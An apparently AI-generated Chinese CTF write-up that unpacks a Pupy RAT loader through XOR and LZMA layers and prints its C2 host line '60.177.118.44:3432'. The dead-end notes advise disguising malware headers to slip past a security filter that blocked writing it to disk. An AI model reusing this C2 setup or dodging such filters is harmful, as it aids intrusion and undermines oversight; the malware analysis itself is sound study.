# 2024-dfjk 巅峰极客初赛 Misc「简历」解题记录

## 题面

- 比赛：2024 第七届"巅峰极客"网络安全技能挑战赛初赛（dfjk = 巅峰极客）
- 题目：Misc「简历」——灵感来源于真实样本，flag 为 c2 ip 的 md5 值（例：ip 为 127.0.0.1，flag 则为 flag{f528764d624db129b32c21fbca0cb8d6}）
- 附件：default.a（4,613,120 字节，C2 远程文件分发服务的存档）
- 出处：CTF-Archives/2024-dfjk（GitHub，附件 Misc/default.a，README 说明题面）

## 解题链（三层嵌套）

### 第 1 层：7 字节循环 XOR → MinGW loader PE

- 文件熵 7.999 全均匀，但头尾出现 `74 74 64 64 64 79 79` 7 字节循环段 → 循环密钥 XOR 明文全零区的典型泄漏。
- **MZ 头推导法**：密文头 `34 23 E4 74` XOR 明文头 `4D 5A 90 00` → 密钥前 4 字节 `79 79 74 74`；从密文循环段回推 7 字节密钥 = **`yyttddd`**（79 79 74 74 64 64 64）。
- 全文件解密 → 合法 x64 PE（5 节：.text/.rdata/.data/.pdata/.xzdata）。
- Loader 特征：MinGW 编译（RtlAddFunctionTable 动态注册 SEH，文件内 .pdata 为垃圾）、导入 VirtualAlloc/WriteProcessMemory/OpenProcess/ResumeThread、字符串 `reflective_inject_dll(pid, dll_buffer, ...)`、`MemoryLoadLibrary failed loading %s`、`python27.dll` → py2exe 变体 + 反射 DLL 注入（APT 风格）。
- 入口分析路径：EP 0x52E4 → CRT 0x5108 → 用户 main 0x104C（消息循环）→ WndProc 0x1000（WM_CLOSE 触发单次守卫）→ 0x140001D18 `call 0x140001c04`，参数硬编码 `lea rcx,[rip+0x17b4a0]` → **.xzdata 内偏移 0x1531E0**，`mov edx, 0x2ed716`。

### 第 2 层：.xzdata 内 LZMA-alone blob → py2exe bundle

- 0x140001C04 语义：`[4B 解压大小][5B LZMA props][LZMA 流]`；**关键坑：size 字段按汇编字节序是大端读**（byte[rcx]→[rsp+0x83] 最高位），LE 读会得到荒谬的 763MB，BE 读 = 0x00A7832D = 10.98MB。
- props = `5D 00 00 00 01`（lc=3 lp=0 pb=2 dict=16MB，标准）。
- **流按声明 size 截断（SDK 语义无 EOS 标记）**：`lzma.decompress(FORMAT_ALONE)` 报 "ended before end-of-stream marker" → 改用 `LZMADecompressor(...).decompress(data, max_length=size)` 成功。
- 解出 10,981,421 字节 py2exe bundle：首 4B=条目数 625；条目 = [4B namelen BE][4B datalen BE][name][data]。内容 = **Pupy RAT 客户端**（pupyimporter.pyo、PupyCompile.pyo、network/lib/ 全家桶、transports obfs3/scramblesuit/rsa_aes/http/websocket、kcp.pyd、psutil、win32*、Crypto、rpyc、poster、pp、dukpy）。

### 第 3 层：.data 内第二 LZMA blob → PYTHONSCRIPT 主脚本

- 0x140001F74 引用 .data VA 0x15920 的 [4B 长度 BE][LZMA blob]（raw 0x14720）→ 第二个 LZMA-alone blob（props `5D 00 00 80 00` dict=8MB，size 728,135）。
- 解压出 728KB py2exe PYTHONSCRIPT（Python 2.7 marshal 代码对象），开头即明文配置：
  `launcher_args = ['--hosts', '60.177.118.44:3432', '-ts', 'ssl', '-cid', ...]`
- C2 唯一性验证：脚本内其余 IP（0.0.0.0/127.0.0.1/1.2.3.4/8.8.8.8/9.9.9.9/5.196.70.86/131.107.255.255/192.0.2.1/192.168.0.1/216.21.3.77/239.255.255.250）均为标准库示例/组播/占位符，`--hosts` 实参仅 60.177.118.44:3432。

## Flag

C2 IP = `60.177.118.44`

flag = flag{md5("60.177.118.44")} = **flag{b57758d5acc923137eef453239ba685b}**

## 死路记录（对 RSI 有价值）

1. 全文件 IC 均匀（0.0039）看似排除循环 XOR——实际正确结论是"加密主体均匀"，结构化 loader 头只占 84KB 被稀释；应先做**滑动窗口熵分段**再逐段判型。
2. 高熵密文中的可打印巧合串（'57PIc2'、'PYZ\x00'）不可当标记，必须看上下文熵。
3. 手写 hex 边界常量零位数错误（0x140002A000 vs 0x14002A000）导致引用扫描 0 命中；边界一律由 ImageBase 计算式推导。
4. 解出的恶意 PE 落盘后 open 报 errno 22（exists()==True，疑似安全过滤）→ 恶意样本分析全程内存处理，需要落盘时改头换尾。
5. LZMA size 大端读是本 loader 的私有格式（SDK LzmaUncompress 外部传 size），与 python-lzma FORMAT_ALONE 的 LE size 头不同。

## 可迁移模式

- **MZ-XOR 密钥恢复**：密文头 4 字节 XOR `4D 5A 90 00` 得密钥前缀；若密钥为 N 字节循环，用密文内部长循环段（明文零区）验证候选 N。适用于所有"多字节循环 XOR 加密的 PE"家族。
- **py2exe 变体三件套**：.xzdata/.资源节大块高熵 + 硬编码 `lea rcx,[rip+X]; mov edx,SIZE; call LzmaUncompress` + bundle 内 Pupy/network-lib 特征 = Pupy RAT 离线客户端，PYTHONSCRIPT 在独立第二 blob。
- Pupy 客户端的 C2 永远在主脚本 launcher_args（--hosts IP:PORT -ts TRANSPORT），提取后按题意变换（本题 md5）。

> AI生成
